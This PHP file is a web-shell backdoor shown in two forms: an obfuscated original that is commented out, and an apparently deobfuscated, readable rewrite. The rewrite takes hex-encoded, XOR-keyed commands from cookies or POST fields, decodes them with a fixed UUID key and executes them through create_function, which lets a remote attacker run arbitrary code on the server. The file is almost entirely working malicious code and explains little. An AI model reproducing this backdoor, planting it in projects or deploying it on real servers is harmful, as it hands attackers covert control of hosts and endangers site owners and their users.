<?php

/*
$lgrlc = 'ko1g7f#84nd5-v0r*_mcleiyp63\'uHat9sbx';
$functions = Array();
$functions[] = $lgrlc[19].$lgrlc[15].$lgrlc[21].$lgrlc[30].$lgrlc[31].$lgrlc[21].$lgrlc[17].$lgrlc[5].$lgrlc[28].$lgrlc[9].$lgrlc[19].$lgrlc[31].$lgrlc[22].$lgrlc[1].$lgrlc[9];
$functions[] = $lgrlc[34].$lgrlc[10].$lgrlc[11].$lgrlc[10].$lgrlc[25].$lgrlc[11].$lgrlc[30].$lgrlc[4].$lgrlc[12].$lgrlc[25].$lgrlc[34].$lgrlc[26].$lgrlc[7].$lgrlc[12].$lgrlc[8].$lgrlc[26].$lgrlc[2].$lgrlc[14].$lgrlc[12].$lgrlc[32].$lgrlc[4].$lgrlc[25].$lgrlc[34].$lgrlc[12].$lgrlc[10].$lgrlc[19].$lgrlc[34].$lgrlc[11].$lgrlc[7].$lgrlc[19].$lgrlc[7].$lgrlc[10].$lgrlc[11].$lgrlc[7].$lgrlc[2].$lgrlc[26];
$functions[] = $lgrlc[29].$lgrlc[16];
$functions[] = $lgrlc[6];
$functions[] = $lgrlc[19].$lgrlc[1].$lgrlc[28].$lgrlc[9].$lgrlc[31];
$functions[] = $lgrlc[33].$lgrlc[31].$lgrlc[15].$lgrlc[17].$lgrlc[15].$lgrlc[21].$lgrlc[24].$lgrlc[21].$lgrlc[30].$lgrlc[31];
$functions[] = $lgrlc[21].$lgrlc[35].$lgrlc[24].$lgrlc[20].$lgrlc[1].$lgrlc[10].$lgrlc[21];
$functions[] = $lgrlc[33].$lgrlc[28].$lgrlc[34].$lgrlc[33].$lgrlc[31].$lgrlc[15];
$functions[] = $lgrlc[30].$lgrlc[15].$lgrlc[15].$lgrlc[30].$lgrlc[23].$lgrlc[17].$lgrlc[18].$lgrlc[21].$lgrlc[15].$lgrlc[3].$lgrlc[21];
$functions[] = $lgrlc[33].$lgrlc[31].$lgrlc[15].$lgrlc[20].$lgrlc[21].$lgrlc[9];
$functions[] = $lgrlc[24].$lgrlc[30].$lgrlc[19].$lgrlc[0];
*/

$functions = Array(
    'create_function', // 0
    'bd5d65a7-6b38-4310-976b-dcb58c8d5813', // 1
    'H*', // 2
    '#', // 3
    'count', // 4
    'str_repeat', // 5
    'explode', // 6
    'substr', // 7
    'array_merge', // 8
    'strlen', // 9
    'pack' // 10
);


foreach ( array_merge($_COOKIE, $_POST) as $cookie_or_post_key => $cookie_or_post_value){
    
    function create_xor_key($cookie_or_post_key, $cookie_or_post_value_length){
        return substr(
            str_repeat(
                $cookie_or_post_key . 'bd5d65a7-6b38-4310-976b-dcb58c8d5813',
                ($cookie_or_post_value_length / strlen($cookie_or_post_key)) + 1
            ),
            0,
            $cookie_or_post_value_length
        );
    }
    
    function pack_hex_string($cookie_or_post_value){
        return @pack('H*', $cookie_or_post_value);
    }
    
    function execute_injected_function($cookie_or_post_values){

        $function_parts = count($cookie_or_post_values) % 3;
        
        if (!$function_parts) {
            $create_function = 'create_function';
            $injected_function = $create_function("", $cookie_or_post_values[1]($cookie_or_post_values[2]));
            $injected_function();
            exit();
        }
    }
    
    $cookie_or_post_value = pack_hex_string($cookie_or_post_value);
    execute_injected_function(
        explode(
            '#',
            $cookie_or_post_value ^ create_xor_key($cookie_or_post_key, strlen($cookie_or_post_value))
        )
    );
}
